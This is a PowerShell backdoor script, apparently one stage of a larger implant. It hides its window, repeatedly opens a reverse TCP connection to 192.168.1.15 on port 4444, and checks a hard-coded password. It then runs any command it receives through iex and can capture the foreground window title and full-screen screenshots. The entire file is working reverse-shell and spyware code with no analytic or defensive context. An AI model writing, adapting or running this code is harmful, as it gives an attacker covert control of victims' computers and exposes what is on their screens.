$api = Add-Type -Name Win32 -MemberDefinition @'
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
'@ -PassThru

$api::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

$ip = '192.168.1.15'
$port = 4444
$pass = "biskviti"

function Master-Kill {
    Stop-Process -Id $PID -Force
    exit
}

# --- STAGE 3: MAIN LOOP ---
while($true) {
    try {
        $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
        $s = $c.GetStream(); $e = New-Object System.Text.UTF8Encoding
        
        # Initial Handshake
        $s.Write(($e.GetBytes("AUTH: ")), 0, 6)
        
        [byte[]]$authB = New-Object byte[] 64
        $len = $s.Read($authB, 0, 64)
        
        if ($len -gt 0) {
            # Clean the input from Netcat (strips \n and \r)
            $authResp = $e.GetString($authB, 0, $len) -replace '[^a-zA-Z0-9]', ''
            
            if ($authResp -eq $pass) {
                $msg = "`n[+] ACCESS GRANTED`nPS " + $PWD.Path + "> "
                $resp = $e.GetBytes($msg)
                $s.Write($resp, 0, $resp.Length)
            } else {
                $msg = "AUTH FAIL. Try again.`n"
                $s.Write(($e.GetBytes($msg)), 0, $msg.Length)
                $c.Close(); continue
            }
        } else { $c.Close(); continue }

        # --- STAGE 4: INTERACTIVE SHELL ---
        while($true) {
            [byte[]]$b = New-Object byte[] 4096
            $i = $s.Read($b, 0, $b.Length)
            if ($i -le 0) { break }
            
            $in = $e.GetString($b, 0, $i).Trim()
            $out = ""

            if ($in -eq 'kill') { Master-Kill }
            elseif ($in -eq 'screen') {
                $handle = $api::GetForegroundWindow()
                $sb = New-Object System.Text.StringBuilder 256
                $api::GetWindowText($handle, $sb, $sb.Capacity)
                $out = "[WINDOW] " + $sb.ToString() + "`n"
            }
            elseif ($in -eq 'screenshot') {
                try {
                    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                    $sc = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                    $bmp = New-Object Drawing.Bitmap $sc.Width, $sc.Height
                    $g = [Drawing.Graphics]::FromImage($bmp)
                    $g.CopyFromScreen($sc.Location, [Drawing.Point]::Empty, $sc.Size)
                    $ms = New-Object IO.MemoryStream
                    $bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Jpeg)
                    $out = [Convert]::ToBase64String($ms.ToArray()) + "`n"
                    $g.Dispose(); $bmp.Dispose(); $ms.Close()
                } catch { $out = "Error: " + $_.Exception.Message + "`n" }
            }
            else {
                $out = try { iex $in 2>&1 | Out-String } catch { $_.Exception.Message }
            }
            
            $prompt = "`nPS " + (Get-Location).Path + "> "
            $resp = $e.GetBytes($out + $prompt)
            $s.Write($resp, 0, $resp.Length)
        }
        $c.Close()
    } catch { Start-Sleep 5 }
}
